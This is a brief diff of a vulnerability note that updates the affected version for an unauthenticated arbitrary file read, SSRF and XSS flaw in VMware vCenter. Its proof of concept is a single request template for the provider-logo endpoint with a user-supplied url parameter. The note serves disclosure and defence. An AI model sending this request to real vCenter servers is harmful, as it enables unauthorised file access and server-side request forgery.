@@ -1,4 +1,4 @@
-# VMware vCenter earlier versions (7.0.2) has unauthorized arbitrary file read + ssrf + xss vulnerability
+# VMware vCenter earlier versions (7.0.2.00100) has unauthorized arbitrary file read + ssrf + xss vulnerability
 ## POC
 https://{vCenterserver}/ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url={url}
 
